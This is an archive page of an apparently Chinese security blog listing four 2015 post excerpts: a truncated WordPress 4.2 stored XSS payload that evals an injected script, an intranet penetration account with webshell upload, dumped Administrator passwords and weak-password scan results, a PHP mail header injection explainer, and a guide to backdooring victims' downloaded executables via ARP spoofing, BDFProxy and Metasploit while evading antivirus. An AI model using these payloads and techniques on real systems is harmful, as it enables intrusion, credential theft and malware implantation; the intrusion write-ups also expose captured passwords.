<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>Archives: 2015/4 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="home-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      
<main class="content" role="main">
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2015-04-28T06:06:02.000Z" itemprop="datePublished">
          2015-04-28
      </time>
    
    
    | 
    <a href='/tag/xss/'>xss</a>,
    
    <a href='/tag/Wordpress/'>Wordpress</a>,
    
    <a href='/tag/Xsser/'>Xsser</a>
    
    
</span>
      <h2 class="post-title"><a href="/1109.seo/">WordPress 4.2 Stored Xss Exp & Xsser Platform Plugin</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        &#160;  完美payload     &lt;abbr title=&quot;qweqw style=display:block;width:9900px;position:absolute;height:9900px;top:-100px;left:-100px; onmouseover=eval(unescape(/with%28document%290%5Bbody.appendChild%28createElement%
      
      </p>
      
      <p>
          <a href="/1109.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2015-04-27T06:39:14.000Z" itemprop="datePublished">
          2015-04-27
      </time>
    
    
    | 
    <a href='/tag/内网渗透/'>内网渗透</a>
    
    
</span>
      <h2 class="post-title"><a href="/1108.seo/">某内网渗透实例</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p>1.外网入口:</p>  <p>目标:vlun.com[打码需要]</p>  <p>从m.vlun.com分站入手，发现有一个注入</p>  <p><a href="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image001.png" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image001_thumb.png" width="591" height="180" /></a></p>  <p>直接备份一个webshell</p>  <p><a href="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image003.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image003_thumb.jpg" width="580" height="393" /></a></p>  <p><a href="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image004.png" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image004_thumb.png" width="472" height="257" /></a></p>  <p>接着提权加抓密码的得到:</p>  <p>UserName: Administrator</p>  <p>password: vlun,123【之前的密码，也被抓下来了】</p>  <p>UserName: Administrator</p>  <p>password: vlun,54a【可以发现这个密码和ip有关！】</p>  <p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>  <p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>  <p>2.<a href="http://ha.cker.in/tag/内网渗透" target="_blank">内网渗透</a>:</p>  <p>2.1. 10.135.106.0/24段</p>  <p>本机在这个段，而且之前密码来看，密码和ip有关，</p>  <p>也就是说假设ip是10.135.106.108，那他的口令一个这样administrator:vlun,108a</p>  <p>So，密码将字典加入凤凰扫描器，开始扫描；</p>  <p>Result:</p>  <p>Mysql:</p>  <p>10.135.106.25 mysql at 3306 has weaken password!!——-root:123456</p>  <p>10.135.106.86 mysql at 3306 has weaken password!!——-root:root</p>  <p>Ssh:</p>  <p>10.135.106.245 ssh at 22 has weaken password!!——-root:vlun,123</p>  <p>Smb:</p>  <p>10.135.106.75 smb at 445 has weaken password!!——-administrator:vlun,123</p>  <p>10.135.106.160 smb at 445 has weaken password!!——-administrator:vlun,123</p>  <p>10.135.106.54 smb at 445 has weaken password!!——-administrator:vlun,54a</p>  <p>10.135.106.41 smb at 445 has weaken password!!——-administrator:vlun,41a</p>  <p>10.135.106.180 smb at 445 has weaken password!!——-administrator:vlun,180a</p>  <p>喜欢sock5代理，可以方便的用proxychains和proxifier连接。</p>  <p>想用hdtran做一个sockets代理，结果老给杀掉，直接用python写一个类似功能的，ssock_win.exe 做了sock5代理并反弹出来~</p>  <p>上图：</p>  <p><a href="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image006.jpg" rel="lightbox"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/26bb1a8ec3a2_1C9B/clip_image006_thumb.jpg" width="580" height="334" /></a></p><br>
      
      </p>
      
      <p>
          <a href="/1108.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2015-04-27T06:26:16.000Z" itemprop="datePublished">
          2015-04-27
      </time>
    
    
    | 
    <a href='/tag/邮件注入/'>邮件注入</a>
    
    
</span>
      <h2 class="post-title"><a href="/1107.seo/">实战 PHP邮件注入攻击技术</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p>1. 简介</p>  <hr align="center" size="0" width="100%" noshade="noshade" />  <p>如今,互联网的使用急剧上升,但绝大多数互联网用户没有安全知识背景。大多数的人都会使用互联网通过邮件Email的方式和他人进行通信。出于这个原因,大多数网站允许他们的用户联系他们，向网站提供建议,报告一个问题,或者要求反馈,用户将会发送反馈给网站管理员的电子邮件。   <br />不幸的是,大多数web开发人员对安全编码Code-Security没有足够的认识,其中的一些程序猿使用现成的库或框架,这些库受到许多已知的漏洞。这些漏洞是已经公布,厂商并已经对其进行了修补，并且相应的攻击源代码poc都在互联网上可下载的,但大多数开发人员都懒得升级到最新版本。</p>  <p>今天我们要谈论电子邮件注射,攻击者可以使用你的邮件服务器来发送垃圾邮件。</p>  <p>2. 邮件注入</p>  <hr align="center" size="0" width="100%" noshade="noshade" />  <p>From Wikipedia:</p>  <p>电子<a href="http://ha.cker.in/tag/邮件注入" target="_blank">邮件注入</a>是一个安全漏洞,这种漏洞广泛存在于在互联网电子邮件收发应用中。这是电子邮件注射和HTTP头注射类似。和<a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>攻击类似,这种漏洞是一类常见的的漏洞,发生在当一个编程语言是嵌入到另一个，例如MYSQL嵌入到PHP中。</p>  <p>当一个可以提交数据到一个Web应用程序表单被添加到一个Web页面,恶意用户可能会利用MIME格式添加额外的信息到要发送的消息中(POST/GET),比如一个新的收件人列表或一个完全不同的消息体。因为MIME格式使用回车分隔在数据包中信息(HTTP数据包中的每一行之间都有一个换行符,在POST和HTTP HEADER之间有两个换行符),通过添加回车提交表单数据(使用FB的一些插件可以很容易的做到),可以允许一个简单的留言板是用来发送成千上万的消息。同样,一个垃圾邮件发送者可以使用这种战术的恶意发送大量的匿名消息。</p>  <p>电子邮件注入是针对PHP内置邮件功能的一种攻击类型。它允许恶意攻击者注入任何邮件头字段,BCC、CC、主题等,它允许黑客通过注入手段从受害者的邮件服务器发送垃圾邮件。由于这个原因,这种攻击称为电子邮件注入,或者邮件形式滥发。这个漏洞是不限于PHP。它可能会影响任何从用户UI接收消息并发送电子邮件消息的应用程序。这种攻击的主要原因是不适当的用户输入验证或应用程序根本没有验证和过滤机制。</p>  <p>3. 邮件注入的攻击原理</p>  <hr align="center" size="0" width="100%" noshade="noshade" />  <p>中国古话说得好: 知其然才能知其所以然。   <br />为了解释邮件注入的工作原理，我们必须先了解PHP Email函数的工作原理。下面是从PHP Manual中找到API解释</p>  <p>mail():</p>  <p><a href="http://www.php.net/manual/en/function.mail.php">http://www.php.net/manual/en/function.mail.php</a></p>  <p>bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] )</p>  <p>你可以注意到,这需要三个必填参数(”目的地、主题和消息”)和其他一些可选参数和函数返回一个布尔值。</p>  <p>那么让我们来看看一个带漏洞的代码来演示这个漏洞:</p>  <p><a href="http://img.cker.in/PHP_138FF/clip_image002.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="PHP邮件注入攻击技术" border="0" alt="PHP邮件注入攻击技术" src="http://img.cker.in/PHP_138FF/clip_image002_thumb.jpg" width="694" height="141" /></a></p><br>
      
      </p>
      
      <p>
          <a href="/1107.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2015-04-21T09:52:19.000Z" itemprop="datePublished">
          2015-04-21
      </time>
    
    
    | 
    <a href='/tag/ettercap/'>ettercap</a>,
    
    <a href='/tag/kaili/'>kaili</a>,
    
    <a href='/tag/BDFProxy/'>BDFProxy</a>
    
    
</span>
      <h2 class="post-title"><a href="/1106.seo/">内网渗透之PC控制及完美过杀毒</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p>一、PC控制篇</p>  <p>在内网渗透的过程中,我们为了达到目标的长期控制,常会选择在目标PC上种植木马，此篇中主要讲述如何在目标下载exe及zip文件的时候在zip文件及exe程序当中插入我们的后门代码。这样，只要目标运行了下载的程序就能顺利将木马植入目标主机。</p>  <p>（一）用到的工具：</p>  <p>1.<a href="http://ha.cker.in/tag/kali" target="_blank">kali</a></p>  <p>2.<a href="http://ha.cker.in/tag/ettercap" target="_blank">ettercap</a></p>  <p>3.<a href="http://ha.cker.in/tag/BDFProxy" target="_blank">BDFProxy</a></p>  <p>4.msf</p>  <p>其中BDFProxy在kali里面默认没有安装，安装请参考：<a href="https://github.com/secretsquirrel/BDFProxy.git">https://github.com/secretsquirrel/BDFProxy.git</a></p>  <p>（二）实现步骤：</p>  <p>1.在成功安装好BDFProxy之后首先要进行一些配置，它的配置文件在/BDFProxy/bdfproxy.cfg，其中要注意修改以下两处：</p>  <p><a href="http://img.cker.in/PC_191B/clip_image001.png" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/PC_191B/clip_image001_thumb.png" width="329" height="219" /></a></p>  <p>图-1，BDFProxy默认监听的端口</p>  <p><a href="http://img.cker.in/PC_191B/clip_image002.png" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/PC_191B/clip_image002_thumb.png" width="426" height="293" /></a></p>  <p>图-2，后门代码反弹的主机及使用的playload</p>  <p>1. 以上配置好之后我们来启动BDFProxy。</p>  <p><a href="http://img.cker.in/PC_191B/clip_image004.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/PC_191B/clip_image004_thumb.jpg" width="580" height="281" /></a></p>  <p>图-3，启动BDFProxy </p>  <p>2.打开日志，方便我们时时查看执行情况。图-4</p>  <p><a href="http://img.cker.in/PC_191B/clip_image005.png" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/PC_191B/clip_image005_thumb.png" width="389" height="185" /></a></p>  <p>图-4，打开BDFProxy日志</p>  <p>3.启动msfconsole，注意这里我们用BDFProxy生成的配置文件来启动msfconsole。图-5</p>  <p><a href="http://img.cker.in/PC_191B/clip_image007.jpg" rel="lightbox"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007" border="0" alt="clip_image007" src="http://img.cker.in/PC_191B/clip_image007_thumb.jpg" width="580" height="191" /></a></p>  <p>图-5，启动msfconsole</p>  <p>4.启动ettercap 来执行arp欺骗，具体的arp欺骗不在本篇的讨论范围,请自行查阅相关资料.</p><br>
      
      </p>
      
      <p>
          <a href="/1106.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <nav class="pagination" role="pagination">
    
    <span class="page-number">Page 1 of 1</span>
    
  </nav>
</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archives"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
